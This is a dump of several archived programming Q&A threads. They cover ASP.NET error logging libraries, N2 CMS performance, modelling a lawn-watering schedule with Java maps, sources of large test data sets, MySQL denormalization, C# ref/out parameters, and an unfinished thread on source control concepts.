 <p>I use <a href=""http://code.google.com/p/elmah/"">elmah</a>.  It has some really nice features and here is a <a href=""http://www.codeproject.com/KB/aspnet/ELMAHDemo.aspx"">CodeProject</a> article on it.  I think the StackOverflow team uses elmah also!</p>
 <p>I've been using the Enterprise Library's Logging objects. It allows you to have different types of logging (flat file, e-mail, and/or database). It's pretty customizable and has a pretty good interface for updating your web.config for the configuration of the logging. Usually I call my logging from the On Error in the Global.asax.</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/cc511708.aspx"" rel=""nofollow"" title=""Coding Guidelines for Cocoa"">Here's a link to the MSDN</a></p>
 <p>I've been using <a href=""http://logging.apache.org/log4net/index.html"" rel=""nofollow"">Log4net</a>, configured to email details of fatal errors.  It's also set up to log everything to a log file, which is invaluable when trying to debug problems.  The other benefit is that if that standard functionality doesn't do what you want it to, it's fairly easy to write a custom appender which can process the logging information as required.</p>

<p>Having said that, I'm using this in tandem with a custom error handler which sends out a html email with a bit more information than is included in the standard log4net emails - page, session variables, cookies, http server variables, etc.</p>

<p>These are both wired up in the Application_OnError event, where the exception is logged as a fatal exception in log4net (which then causes it to be emailed to a specified email address), and also handled using the custom error handler.</p>

<p>First heard about <a href=""http://code.google.com/p/elmah/"" rel=""nofollow"">Elmah</a> from the Coding Horror blog entry, <a href=""http://www.codinghorror.com/blog/archives/001118.html"" rel=""nofollow"">Crash Responsibly</a>, and although it looks promising I'm yet to implement it any projects.</p>
 <p>I recently built an asp.net webservice with NLog, which I use for all my desktop apps.  The logging works fine when I'm debugging in Visual Studio, but as soon as I switch to IIS the log file isn't created; I've not yet determined why, but it the fact that I need to look for a solution makes me want to try something else for my asp.net needs!</p>
 <p>I use log4net and where ever I <em>expect</em> an exception I log it to the appropriate level. I tend not to re-throw the exception because it doesn't really allow for as-nice user experience, there is less info you can provide at the current state.</p>

<p>I'll have Application_Error also configured to catch any exception which was not expected and the error is logged as a Fatal priority through log4net (well, 404's are detected and logged as Info as they aren't that high severity).</p>
 <p>We use EnterpriseLibrary.ExceptionHandling.Logging.  I like it a bit better than log4net because not only do we control the logging completely, but we can control the Throw/NoThrow decision within config as well.</p>
"
"Considering N2 CMS but worried about performance. Is this justified? <p>Hy, does anyone worked with N2 Content Management System(<a href=""http://www.codeplex.com/n2"" rel=""nofollow"">http://www.codeplex.com/n2</a>).
If yes, how does it perform, performance wise(under heavy load)?
It seems pretty simple and easy to use.</p>

<p>Adrian</p>
 <p>Maybe try this question at <a href=""http://www.codeplex.com/n2/Thread/List.aspx"" rel=""nofollow""><a href=""http://www.codeplex.com/n2/Thread/List.aspx"" rel=""nofollow"">http://www.codeplex.com/n2/Thread/List.aspx</a></a></p>

<p>They might be able to tell you about performance limitations or bottlenecks.</p>
 <p>I tried it and it looked promising at first but quickly had issues actually deploying it to a Medium Trust host.</p>
 <p><a href=""http://whocanhelpme.codeplex.com/"" rel=""nofollow"">http://whocanhelpme.codeplex.com/</a> and <a href=""http://www.fancydressoutfitters.co.uk/"" rel=""nofollow"">http://www.fancydressoutfitters.co.uk/</a> are n2cms based.</p>

<p>Read more on James Broome's blog <a href=""http://jamesbroo.me/integrating-n2cms-into-who-can-help-me/"" rel=""nofollow"">http://jamesbroo.me/integrating-n2cms-into-who-can-help-me/</a></p>
 <p>i have 2 high traffic web sites both using N2 CMS, its fast and reliable</p>
 <p>We've built numerous sites in N2 and we love it.</p>

<p>Many of these sites have in excess of 20,000 users accessing on a daily basis.  We've also load tested up to 50,000 users with no problems.</p>

<p>It's running on fairly modest hardware - one web server, one db server.</p>

<p>With caching enabled it is extremly fast, as the database hardly gets hit!</p>
"
"Arrays of Arrays in Java <p>This is a nasty one for me...  I'm a PHP guy working in Java on a JSP project.  I know how to do what I'm attempting through too much code and a complete lack of finesse.   I'd prefer to do it RIGHT. :) Here is the situation:</p>

<p>I'm writing a small display to show customers what days they can water their lawns based on their watering group (ABCDE) and what time of year it is.  Our seasons look like this:
Summer (5-1 to 8-31) 
Spring  (3-1 to 4-30) 
Fall (9-1 to 10-31)
Winter (11-1 to 2-28) </p>

<p>An example might be:</p>

<p>If I'm in group A, here would be my allowed times:
Winter: Mondays only
Spring: Tues, Thurs, Sat
Summer: Any Day
Fall: Tues, Thurs, Sat</p>

<p>If I was writing this in PHP I would use arrays like this:</p>

<pre><code>//M=Monday,t=Tuesday,T=Thursday.... etc
$schedule[""A""][""Winter""]='M';
$schedule[""A""][""Spring""]='tTS';
$schedule[""A""][""Summer""]='Any';
$schedule[""A""][""Fall""]='tTS';
$schedule[""B""][""Winter""]='t';
</code></pre>

<p>I COULD make the days arrays (array(""Tuesday"",""Thursday"",""Saturday"")) etc, but it is not necessary for what I'm really trying to accomplish.</p>

<p>I will also need to setup arrays to determine what season I'm in:</p>

<pre><code>$seasons[""Summer""][""start""]=0501;
$seasons[""Summer""][""end""]=0801;
</code></pre>

<p>Can anyone suggest a really cool way to do this? I will have today's date and the group letter.  I will need to get out of my function a day (M) or a series of days (tTS), (Any).</p>

<p>Thanks, folks!</p>
 <p>You could do essentially the same code with Hashtables (or some other Map):</p>

<pre><code>Hashtable&lt;String, Hashtable&lt;String, String&gt;&gt; schedule
    = new Hashtable&lt;String, Hashtable&lt;String, String&gt;&gt;();
schedule.put(""A"", new Hashtable&lt;String, String&gt;());
schedule.put(""B"", new Hashtable&lt;String, String&gt;());
schedule.put(""C"", new Hashtable&lt;String, String&gt;());
schedule.put(""D"", new Hashtable&lt;String, String&gt;());
schedule.put(""E"", new Hashtable&lt;String, String&gt;());

schedule.get(""A"").put(""Winter"", ""M"");
schedule.get(""A"").put(""Spring"", ""tTS"");
// Etc...
</code></pre>

<p>Not as elegant, but then again, Java isn't a dynamic language, and it doesn't have hashes on the language level.</p>

<p>Note: You might be able to do a better solution, this just popped in my head as I read your question.</p>
 <p>There is no pretty solution.  Java just doesn't do things like this well.  Mike's solution is pretty much the way to do it if you want strings as the indices (keys).  Another option if the hash-of-hashes setup is too ugly is to append the strings together (shamelessly stolen from Mike and modified):</p>

<pre><code>Hashtable&lt;String, String&gt; schedule = new Hashtable&lt;String, String&gt;();
schedule.put(""A-Winter"", ""M"");
schedule.put(""A-Spring"", ""tTS"");
</code></pre>

<p>and then lookup:</p>

<pre><code>String val = schedule.get(group + ""-"" + season);
</code></pre>

<p>If you're unhappy with the general ugliness (and I don't blame you), put it all behind a method call:</p>

<pre><code>String whenCanIWater(String group, Date date) { /* ugliness here */ }
</code></pre>
 <p>@Brian Warshaw</p>

<p>FYI, with Java 1.5, primitives are now autoboxed to the wrapped version, so you can call it with just the primitive:</p>

<pre><code>Hashtable&lt;String, Integer&gt; hash = new Hashtable&lt;String, Integer&gt;();
hash.put(""key"", 15); // Works from Java 1.5 on
</code></pre>
 <p>I'm not a Java programmer, but getting away from Java and just thinking in terms that are more language agnostic - a cleaner way to do it might be to use either constants or enumerated types.  This should work in any langauge that supports multi-dimensional arrays.</p>

<p>If using named constants, where, for example: </p>

<pre><code>int A = 0;
int B = 1;
int C = 2;
int D = 3;

int Spring = 0; 
int Summer = 1;
int Winter = 2; 
int Fall = 3;
...
</code></pre>

<p>Then the constants serve as more readable array subscripts:</p>

<pre><code>schedule[A][Winter]=""M"";
schedule[A][Spring]=""tTS"";
schedule[A][Summer]=""Any"";
schedule[A][Fall]=""tTS"";
schedule[B][Winter]=""t"";
</code></pre>

<p>Using enumerated types:</p>

<pre><code>enum groups
{
  A = 0,
  B = 1,
  C = 2,
  D = 3
}

enum seasons
{
  Spring = 0,
  Summer = 1,
  Fall = 2,
  Winter = 3
}
...
schedule[groups.A][seasons.Winter]=""M"";
schedule[groups.A][seasons.Spring]=""tTS"";
schedule[groups.A][seasons.Summer]=""Any"";
schedule[groups.A][seasons.Fall]=""tTS"";
schedule[groups.B][seasons.Winter]=""t"";
</code></pre>
 <p>Don't try to be as dynamic as PHP is. You could try to first <strong>define</strong> what you need.</p>

<pre><code>interface Season
{
    public string getDays();
}

interface User
{
    public Season getWinter();
    public Season getSpring();
    public Season getSummer();
    public Season getFall();
}

interface UserMap
{
    public User getUser(string name);
}
</code></pre>

<p>And please, read the documentation of <a href=""http://java.sun.com/javase/6/docs/api/java/util/Hashtable.html"">Hashtable</a> before using it. This class is synchronized which means that each call is protected against multithreading which really slows the access when you don't need the extra protection. Please use any <a href=""http://java.sun.com/javase/6/docs/api/java/util/Map.html"">Map</a> implementation instead like <a href=""http://java.sun.com/javase/6/docs/api/java/util/HashMap.html"">HashMap</a> or <a href=""http://java.sun.com/javase/6/docs/api/java/util/TreeMap.html"">TreeMap</a>.</p>
 <p>It seems like everyone is trying to find the Java way to do it like you're doing it in PHP, instead of the way it ought to be done in Java. Just consider each piece of your array an object, or, at the very least, the first level of the array as an object and each sub level as variables inside the object. The build a data structure that you populate with said objects and access the objects through the data structure's given accessors.</p>

<p>Something like:</p>

<pre><code>class Schedule
{
  private String group;
  private String season;
  private String rundays;
  public Schedule() { this.group = null; this.season = null; this.rundays= null; }
  public void setGroup(String g) { this.group = g; }
  public String getGroup() { return this.group; }
  ...
}

public ArrayList&lt;Schedule&gt; schedules = new ArrayList&lt;Schedule&gt;();
Schedule s = new Schedule();
s.setGroup(...);
...
schedules.add(s);
...
</code></pre>

<p>Of course that probably isn't right either. I'd make each season an object, and maybe each weekday list as an object too. Anyway, its more easily reused, understood, and extensible than a hobbled-together Hashtable that tries to imitate your PHP code. Of course, PHP has objects too, and you should use them in a similar fashion instead of your uber-arrays, wherever possible. I do understand the temptation to cheat, though. PHP makes it so easy, and so fun!</p>
 <p>I agree that you should definitely put this logic behind the clean interface of:</p>

<pre><code>public String lookupDays(String group, String date);
</code></pre>

<p>but maybe you should stick the data in a properties file.  I'm not against hardcoding this data in your source files but, as you noticed, Java can be pretty wordy when it comes to nested Collections.  Your file might looks like:</p>

<blockquote>
  <p>A.Summer=M<br />
  A.Spring=tTS<br />
  B.Summer=T</p>
</blockquote>

<p>Usually I don't like to move static data like this to an external file because it increases the ""distance"" between the data and the code that uses it.  However, whenever you're dealing with nested Collections, especially maps, things can get real ugly, real fast.</p>

<p>If you don't like this idea, maybe you can do something like this:</p>

<pre><code>public class WaterScheduler
{
  private static final Map&lt;String, String&gt; GROUP2SEASON = new HashMap&lt;String, String&gt;();
  static
  {
    addEntry(""A"", ""Summer"", ""M"");
    addEntry(""A"", ""Spring"", ""tTS"");
    addEntry(""B"", ""Summer"", ""T"");
  }

  private static void addEntry(String group, String season, String value)
  {
    GROUP2SEASON.put(group + ""."" + season, value);
  }

}
</code></pre>

<p>You lose some readability but at least the data is closer to where it's going to be used.</p>
 <p>I'm totally at a loss as to why some of you seem to think that throwing gobs of objects at the code is the way to go.  For example, there are exactly four seasons, and they don't <em>do</em> or <em>store</em> anything.  How does it simplify anything to make them objects?  Wing is quite right that these should probably be <strong><em>constants</em></strong> (or maybe enums).</p>

<p>What Bruce needs, at it's heart, is simply a lookup table.  He doesn't need a hierarchy of objects and interfaces; he needs a way to look up a schedule based on a season and a group identifier.  Turning things into objects only makes sense if they have responsibilities or state.  If they have neither, then they are simply identifiers, and building special objects for them just makes the codebase larger.</p>

<p>You <em>could</em> build, e.g., <code>Group</code> objects that each contain a set of schedule strings (one for each season), but if all the <code>Group</code> object does is provide lookup functionality, then you've reinvented the lookup table in a much less intuitive fashion.  If he has to look up the group, and then lookup the schedule, all he has is a two-step lookup table that took longer to code, is more likely to be buggy, and will be harder to maintain.</p>
 <p>I think <a href=""http://stackoverflow.com/questions/12870/arrays-of-arrays-in-java#12923"" rel=""nofollow"">Ian</a> is absolutely right: stop trying to implement your PHP code in Java.  Instead, take a step back and think about how you might design this from scratch.  In particular, why not put all that data into a database, instead of hard-coding it in your sources or using properties files?  Using a database will be much easier to maintain, and there are a <a href=""http://www.mysql.com/"" rel=""nofollow"">variety</a> <a href=""http://www.postgresql.org/"" rel=""nofollow"">of</a> <a href=""http://hsqldb.sourceforge.net/"" rel=""nofollow"">free</a> <a href=""http://db.apache.org/derby/"" rel=""nofollow"">database</a> engines to choose from.</p>
 <p>@Jason</p>

<blockquote>
  <p>In particular, why not put all that data into a database, instead of hard-coding it in your sources or using properties files? Using a database will be much easier to maintain, and there are a variety of free database engines to choose from.</p>
</blockquote>

<p>Adding a database is an incredibly heavyweight way to solve a problem that fits easily into a text file (or even directly into the source).  There are 5 groups and 4 seasons.  That means there are going to be a total of <em>20 records</em> in the database.</p>
 <p>@<a href=""http://stackoverflow.com/questions/12870/arrays-of-arrays-in-java#12957"" rel=""nofollow"" title=""Dr. Explain"">Derek</a></p>

<blockquote>
  <p>Adding a database is an incredibly heavyweight way to solve a problem that fits easily into a text file (or even directly into the source). There are 5 groups and 4 seasons. That means there are going to be a total of 20 records in the database.</p>
</blockquote>

<p>Two of the database engines I linked to are implemented entirely in Java and can be embedded in an application just by including a jar file.  It's a little heavyweight, sure, but it's a lot more scalable and easier to maintain.  Just because there are 20 records today doesn't mean there won't be more later due to changing requirements or feature creep.</p>

<p>If in a few weeks or months you decide you want to add, say, time of day watering restrictions, it will be much easier to add that functionality if you're already using a database.  Even if that never happens, then you've spent a few hours learning how to embed a database in an application.</p>
 <p>@Jason</p>

<blockquote>
  <p>Two of the database engines I linked to are implemented entirely in Java and can be embedded in an application just by including a jar file. It's a little heavyweight, sure, but it's a lot more scalable and easier to maintain. Just because there are 20 records today doesn't mean there won't be more later due to changing requirements or feature creep.</p>
  
  <p>If in a few weeks or months you decide you want to add, say, time of day watering restrictions, it will be much easier to add that functionality if you're already using a database. Even if that never happens, then you've spent a few hours learning how to embed a database in an application.</p>
</blockquote>

<p>Embedding a DB in Java doesn't make it easier to maintain.  There's now an additional code dependency that did not previously exist.  Updating the set of schedules is now more difficult, as either a custom tool must be coded or a DB-specific interface must be used, whereas previous notepad.exe was sufficient.  Scalability is not a concern here, either.  The needs of this system could increase by a million and the flat file would still work just fine.</p>

<p>Certainly, it's possible that in the future needs will evolve to the point that it's worth moving to a database.  That's when you make the change.  Trying to future-proof an application never works, because we <em>always</em> assume incorrectly about future needs.  We can't say it'll only take a few hours to embed the database either, because we suck at estimating schedules, too.  If there even comes a time when the database is appropriate, <em>then</em> refactor the code to use a database.  In the meantime, <a href=""http://c2.com/cgi/wiki?DoTheSimplestThingThatCouldPossiblyWork"" rel=""nofollow"">do</a> <a href=""http://c2.com/xp/DoTheSimplestThingThatCouldPossiblyWork.html"" rel=""nofollow"">the</a> <a href=""http://www.xprogramming.com/Practices/PracSimplest.html"" rel=""nofollow"">simplest</a> <a href=""http://www.artima.com/intv/simplest.html"" rel=""nofollow"">thing</a> <a href=""http://en.wikiquote.org/wiki/Ward_Cunningham#The_Simplest_Thing_that_Could_Possibly_Work"" rel=""nofollow"">that</a> <a href=""http://iansrobinson.com/2008/06/26/simplest-thing-that-could-possibly-work/"" rel=""nofollow"">could</a> <a href=""http://blog.jayfields.com/2008/06/simplest-thing-that-could-possibly-work.html"" rel=""nofollow"">possibly</a> <a href=""http://www.extremeprogramming.org/rules/simple.html"" rel=""nofollow"">work</a>.</p>
 <p>Does the ""date"" have to be a parameter? If you're just showing the current watering schedule the WateringSchedule class itself can figure out what day it is, and therefore what season it is. Then just have a method which returns a map where the Key is the group letter. Something like:</p>

<pre><code>public Map&lt;String,List&lt;String&gt;&gt; getGroupToScheduledDaysMap() {
  // instantiate a date or whatever to decide what Map to return
}
</code></pre>

<p>Then in the JSP page</p>

<pre><code>&lt;c:forEach var=""day"" items=""${scheduler.groupToScheduledDaysMap[""A""]}""&gt;
   ${day}
&lt;/c:forEach&gt;
</code></pre>

<p>If you need to show the schedules for more than one season, you should have a method in the WateringSchedule class that returns a map where Seasons are the keys, and then Maps of groupToScheduledDays are the values.</p>
 <p>Here's one way it <em>could</em> look like, you can figure the rest out:</p>

<pre><code>A = new Group();
A.getSeason(Seasons.WINTER).addDay(Days.MONDAY);
A.getSeason(Seasons.SPRING).addDay(Days.TUESDAY).addDay(Days.THURSDAY);
A.getSeason(Seasons.SPRING).addDays(Days.MONDAY, Days.TUESDAY, ...);

schedule = new Schedule();
schedule.addWateringGroup( A );
</code></pre>
 <p>I'm with those that suggest encapsulating function in objects.</p>

<pre><code>import java.util.Date;
import java.util.Map;
import java.util.Set;

public class Group {

    private String groupName;

    private Map&lt;Season, Set&lt;Day&gt;&gt; schedule;

    public String getGroupName() {
    	return groupName;
    }

    public void setGroupName(String groupName) {
    	this.groupName = groupName;
    }

    public Map&lt;Season, Set&lt;Day&gt;&gt; getSchedule() {
    	return schedule;
    }

    public void setSchedule(Map&lt;Season, Set&lt;Day&gt;&gt; schedule) {
    	this.schedule = schedule;
    }

    public String getScheduleFor(Date date) {
    	Season now = Season.getSeason(date);
    	Set&lt;Day&gt; days = schedule.get(now);
    	return Day.getDaysForDisplay(days);
    }

}
</code></pre>

<p>EDIT: Also, your date ranges don't take leap years into account:</p>

<blockquote>
  <p>Our seasons look like this: Summer
  (5-1 to 8-31) Spring (3-1 to 4-30)
  Fall (9-1 to 10-31) Winter (11-1 to
  2-28)</p>
</blockquote>
"
"Large Data Sets <p>I'm always looking for large data sets to test various types of programs on. Does anyone have any suggestions?</p>
 <p>Check out the <a href=""http://www.netflixprize.com/"">netflix contest</a>.  I believe they exposed their database, or a large subset, to facilitate the contest.</p>

<p>UPDATE: <a href=""http://www.netflixprize.com/faq"">Their faq</a> says they have 100 million entries in the subset you can download.</p>
 <p>You might want to look at generating random data for <a href=""http://en.wikipedia.org/wiki/Fuzz_testing"" rel=""nofollow"" title=""Araxis Merge"">Fuzz Testing</a>. That would give you a pretty much unlimited amount of test data, and you're more likely to hit edge cases.</p>

<p>Maybe some more information on what kind of test data you want, what format, and for what types of applications?</p>
 <p>I don't know what your target platform is, but if you're developing against a MSSQL database check out <a href=""http://weblogs.asp.net/scottgu/archive/2006/10/18/Visual-Studio-for-Database-Professionals-and-other-Cool-Data-Management-Tools-for-.NET.aspx"" rel=""nofollow"" title=""Araxis Merge"">Visual Studio for Database Professionals</a>. It has a very cool feature where it can generate data for your schema using a data plan that you can define. </p>

<p>Redgate also has a datageneration tool, but I haven't used it.</p>

<p>The advantage is that you can create a data generation plan and use it to populate your database with consistent, large amounts of data which can be tuned to test specific areas of your schema.</p>
 <p>You might also want to check out <a href=""http://theinfo.org/"" rel=""nofollow"" title=""Dr. Explain"">theinfo</a> by Aaron Swartz.</p>

<p>From the site </p>

<blockquote>
  <p>This is a site for large data sets and
  the people who love them: the scrapers
  and crawlers who collect them, the
  academics and geeks who process them,
  the designers and artists who
  visualize them. It's a place where
  they can exchange tips and tricks,
  develop and share tools together, and
  begin to integrate their particular
  projects.</p>
</blockquote>
 <p>I've done some work with the <a href=""http://download.wikimedia.org/"" rel=""nofollow"">Wikimedia</a> download sets, which are huge XML files. Unfortunately, their download server appears to be currently having disk space issues so many of the data sets aren't available. But when it's available, the entire English Wikipedia data set with full history is 2.8 TB (18 GB compressed).</p>
 <p>You might want to have a look at the data for the American Statistical Association <a href=""http://stat-computing.org/dataexpo/2009/"">data expo</a> - it's flight details for all commercial flights in the US for the last 20 years - 120 million records, 11 gig of data.</p>
 <p>A number of <a href=""http://del.icio.us/"" rel=""nofollow"">del.icio.us</a> users (including myself) tag pages that contain public data using the ""publicdata"" tag. You can find that archive <a href=""http://delicious.com/tag/publicdata"" rel=""nofollow"">here</a> and subscribe to an RSS feed for that tag <a href=""http://feeds.delicious.com/v2/rss/tag/publicdata?count=15"" rel=""nofollow"">here</a>. Subscribe to the feed and you'll see a steady stream of interesting datasets that pop up on the web. </p>

<p>Not all of those datasets are large, but they're often interesting.</p>
 <p>If you're interested in personalizing the type of data you're getting, check out <a href=""https://kimonolabs.com"" rel=""nofollow"" title=""Kimono Labs"">Kimono Labs</a>. It's web-scraping software you can use to scrape just about any site for free with no rows returned limit. Just set up an API on it (you can use their url generator to scrape a bunch of urls at once) and then utilize your personal dataset as JSON, CSV, or RSS. </p>
"
"What is a good way to denormalize a mysql database? <p>I have a large database of normalized order data that is becoming very slow to query for reporting.  Many of the queries that I use in reports join five or six tables and are having to examine tens or hundreds of thousands of lines.</p>

<p>There are lots of queries and most have been optimized as much as possible to reduce server load and increase speed.  I think it's time to start keeping a copy of the data in a denormalized format.</p>

<p>Any ideas on an approach?  Should I start with a couple of my worst queries and go from there?</p>
 <p>I know this is a bit tangential, but have you tried seeing if there are more indexes you can add?</p>

<p>I don't have a lot of DB background, but I am working with databases a lot recently, and I've been finding that a lot of the queries can be improved just by adding indexes.</p>

<p>We are using DB2, and there is a command called db2expln and db2advis, the first will indicate whether table scans vs index scans are being used, and the second will recommend indexes you can add to improve performance.  I'm sure MySQL has similar tools...</p>

<p>Anyways, if this is something you haven't considered yet, it has been helping a lot with me... but if you've already gone this route, then I guess it's not what you are looking for.</p>

<p>Another possibility is a ""materialized view"" (or as they call it in DB2), which lets you specify a table that is essentially built of parts from multiple tables.  Thus, rather than normalizing the actual columns, you could provide this view to access the data... but I don't know if this has severe performance impacts on inserts/updates/deletes (but if it is ""materialized"", then it should help with selects since the values are physically stored separately).</p>
 <p>MySQL 5 does support <a href=""http://dev.mysql.com/doc/refman/5.0/en/create-view.html"" rel=""nofollow"" title=""Araxis Merge"">views</a>, which may be helpful in this scenario.  It sounds like you've already done a lot of optimizing, but if not you can use MySQL's <a href=""http://dev.mysql.com/doc/refman/5.0/en/explain.html"" rel=""nofollow"">EXPLAIN</a> syntax to see what indexes are actually being used and what is slowing down your queries.</p>

<p>As far as going about normalizing data (whether you're using views or just duplicating data in a more efficient manner), I think starting with the slowest queries and working your way through is a good approach to take.</p>
 <p>You might also want to consider selecting into a temporary table and then performing queries on that temporary table.  This would avoid the need to rejoin your tables for every single query you issue (assuming that you can use the temporary table for numerous queries, of course).  This basically gives you denormalized data, but if you are only doing select calls, there's no concern about data consistency.</p>
 <p>I know more about mssql that mysql, but I don't think the number of joins or number of rows you are talking about should cause you too many problems with the correct indexes in place.  Have you analyzed the query plan to see if you are missing any?</p>

<p><a href=""http://dev.mysql.com/doc/refman/5.0/en/explain.html""><a href=""http://dev.mysql.com/doc/refman/5.0/en/explain.html"">http://dev.mysql.com/doc/refman/5.0/en/explain.html</a></a></p>

<p>That being said, once you are satisifed with your indexes and have exhausted all other avenues, de-normalization might be the right answer.  If you just have one or two queries that are problems, a manual approach is probably appropriate, whereas some sort of data warehousing tool might be better for creating a platform to develop data cubes.</p>

<p>Here's a site I found that touches on the subject:</p>

<p><a href=""http://www.meansandends.com/mysql-data-warehouse/?link_body%2Fbody=%7Bincl%3AAggregation%7D""><a href=""http://www.meansandends.com/mysql-data-warehouse/?link_body%2Fbody=%7Bincl%3AAggregation%7D"">http://www.meansandends.com/mysql-data-warehouse/?link_body%2Fbody=%7Bincl%3AAggregation%7D</a></a></p>

<p>Here's a simple technique that you can use to keep denormalizing queries simple, if you're just doing a few at a time (and I'm not replacing your OLTP tables, just creating a new one for reporting purposes).  Let's say you have this query in your application:</p>

<pre><code>select a.name, b.address from tbla a 
join tblb b on b.fk_a_id = a.id where a.id=1
</code></pre>

<p>You could create a denormalized table and populate with almost the same query:</p>

<pre><code>create table tbl_ab (a_id, a_name, b_address); 
-- (types elided)
</code></pre>

<p>Notice the underscores match the table aliases you use</p>

<pre><code>insert tbl_ab select a.id, a.name, b.address from tbla a
join tblb b on b.fk_a_id = a.id 
-- no where clause because you want everything
</code></pre>

<p>Then to fix your app to use the new denormalized table, switch the dots for underscores.  </p>

<pre><code>select a_name as name, b_address as address 
from tbl_ab where a_id = 1;
</code></pre>

<p>For huge queries this can save a lot of time and makes it clear where the data came from, and you can re-use the queries you already have.</p>

<p>Remember, I'm only advocating this as the last resort.  I bet there's a few indexes that would help you.  And when you de-normalize, don't forget to account for the extra space on your disks, and figure out when you will run the query to populate the new tables.  This should probably be at night, or whenever activity is low.  And the data in that table, of course, will never exactly be up to date.</p>

<p>[Yet another edit]  Don't forget that the new tables you create need to be indexed too!  The good part is that you can index to your heart's content and not worry about update lock contention, since aside from your bulk insert the table will only see selects.</p>
 <p>In line with some of the other comments, i would definately have a look at your indexing.</p>

<p>One thing i discovered earlier this year on our MySQL databases was the power of composite indexes. For example, if you are reporting on order numbers over date ranges, a composite index on the order number and order date columns could help. I believe MySQL can only use one index for the query so if you just had separate indexes on the order number and order date it would have to decide on just one of them to use. Using the EXPLAIN command can help determine this.</p>

<p>To give an indication of the performance with good indexes (including numerous composite indexes), i can run queries joining 3 tables in our database and get almost instant results in most cases. For more complex reporting most of the queries run in under 10 seconds. These 3 tables have 33 million, 110 million and 140 millions rows respectively. Note that we had also already normalised these slightly to speed up our most common query on the database.</p>

<p>More information regarding your tables and the types of reporting queries may allow further suggestions.</p>
 <p>Further to my previous answer, another approach we have taken in some situations is to store key reporting data in separate summary tables. There are certain reporting queries which are just going to be slow even after denormalising and optimisations and we found that creating a table and storing running totals or summary information throughout the month as it came in made the end of month reporting much quicker as well.</p>

<p>We found this approach easy to implement as it didn't break anything that was already working - it's just additional database inserts at certain points.</p>
 <p>I've been toying with composite indexes and have seen some real benefits...maybe I'll setup some tests to see if that can save me here..at least for a little longer.</p>
 <p>For MySQL I like this talk: <a href=""http://develooper.com/talks/rww-mysql-2008.pdf"" rel=""nofollow"">Real World Web: Performance &amp; Scalability, MySQL Edition</a>. This contains a lot of different pieces of advice for getting more speed out of MySQL.</p>
"
"What do ref, val and out mean on method parameters? <p>I'm looking for a clear, concise and accurate answer.  </p>

<p>Ideally as the actual answer, although links to good explanations welcome.</p>

<p>This also applies to VB.Net, but the keywords are different - <code>ByRef</code> and <code>ByVal</code>.</p>
 <p><code>out</code> means that the parameter will be initialised by the method:</p>

<pre><code>int result; //not initialised

if( int.TryParse( ""123"", out result ) )
   //result is now 123
else
   //if TryParse failed result has still be 
   // initialised to its default value (0)
</code></pre>

<p><code>ref</code> will force the underlying reference to be passed:</p>

<pre><code>void ChangeMyClass1( MyClass input ) {
   input.MyProperty = ""changed by 1"";
   input = null;
   //can't see input anymore ... 
   // I've only nulled my local scope's reference
}

void ChangeMyClass2( ref MyClass input ) {
   input.MyProperty = ""changed by 2"";
   input = null;
   //the passed reference is now null too.
}

MyClass tester = new MyClass { MyProperty = ""initial value"" };

ChangeMyClass1( tester );
// now tester.MyProperty is ""changed by 1""

ChangeMyClass2( ref tester );
// now tester is null
</code></pre>
 <p>This article ""<a href=""http://www.yoda.arachsys.com/csharp/parameters.html#ref"" rel=""nofollow"">Parameter passing in C#</a>"" is the most complete explanation I've read so far.</p>
 <p>One of my own questions at stackoverflow handles this topic too.<br />
It handles about <a href=""http://stackoverflow.com/questions/2027/pass-by-reference-or-pass-by-value"" rel=""nofollow"">""pass by reference"" and ""pass by value""</a> in different types of languages, <a href=""http://stackoverflow.com/questions/2027/pass-by-reference-or-pass-by-value#2554"" rel=""nofollow"">c# is included</a> so maybe you can find some extra information there as well.</p>

<p>Basically it comes down to:</p>

<ul>
<li>ref: the parameter with the ref keyword will be passed <em>by reference</em></li>
<li>out: the parameter with the out keyword will be treated as an <em>output parameter</em></li>
</ul>

<p>but that's really the most basic answer you can give, as it is a little more complex than it is stated here</p>
 <p>By default (in C#), passing an object to a function actually passes a copy of the reference to that object. Changing the parameter itself only changes the value in the parameter, and not the variable that was specified.</p>

<pre><code>void Test1(string param)
{
    param = ""new value"";
}

string s1 = ""initial value"";
Test1(s1);
// s1 == ""initial value""
</code></pre>

<p>Using <code>out</code> or <code>ref</code> passes a reference to the variable specified in the call to the function. Any changes to the value of an <code>out</code> or <code>ref</code> parameter will be passed back to the caller.</p>

<p>Both <code>out</code> and <code>ref</code> behave identically except for one slight difference: <code>ref</code> parameters are required to be initialised before calling, while <code>out</code> parameters can be uninitialised. By extension, <code>ref</code> parameters are guaranteed to be initialised at the start of the method, while <code>out</code> parameters are treated as uninitialised.</p>

<pre><code>void Test2(ref string param)
{
    param = ""new value"";
}

void Test3(out string param)
{
    // Use of param here will not compile
    param = ""another value"";
}

string s2 = ""initial value"";
string s3;
Test2(ref s2);
// s2 == ""new value""
// Test2(ref s3); // Passing ref s3 will not compile
Test3(out s2);
// s2 == ""another value""
Test3(out s3);
// s3 == ""another value""
</code></pre>

<p><strong>Edit</strong>: As <a href=""http://stackoverflow.com/questions/13060/what-do-ref-val-and-out-mean-on-method-parameters#13105"" rel=""nofollow"" title=""dp"">dp</a> points out, the difference between <code>out</code> and <code>ref</code> is only enforced by the C# compiler, not by the CLR. As far as I know, VB has no equivalent for <code>out</code> and implements <code>ref</code> (as <code>ByRef</code>) only, matching the support of the CLR.</p>
 <p>One additional note about ref vs. out: The distinction between the two is enforced by the C# compiler. The CLR does not distinguish between between out and ref. This means that you cannot have two methods whose signatures differ only by an out or ref</p>

<pre><code>void foo(int value) {}

// Only one of the following would be allowed

// valid to overload with ref
void foo(ref int value) {}

// OR with out
void foo(out int value) {}
</code></pre>
"
"The theory (and terminology) behind Source Control <p>I've tried using source control for a couple projects but still don't really understand it.  For these projects, we've used TortoiseSVN and have only had one line of revisions.  (No trunk, branch, or any of that.)  If there is a recommended way to set up source control systems, what are they?  What are the reasons and benifits for setting it up that way?  What is the underlying differences between the workings of a centralized and distributed source control system?</p>
 <p>Think of source control as a giant ""Undo"" button for your source code. Every time you check in, you're adding a point to which you can roll back. Even if you don't use branching/merging, this feature alone can be very valuable.</p>

<p>Additionally, by having one 'authoritative' version of the source control, it becomes much easier to back up.</p>

<p>Centralized vs. distributed... the difference is really that in distributed, there isn't necessarily one 'authoritative' version of the source control, although in practice people usually still do have the master tree.</p>

<p>The big advantage to distributed source control is two-fold:</p>

<ol>
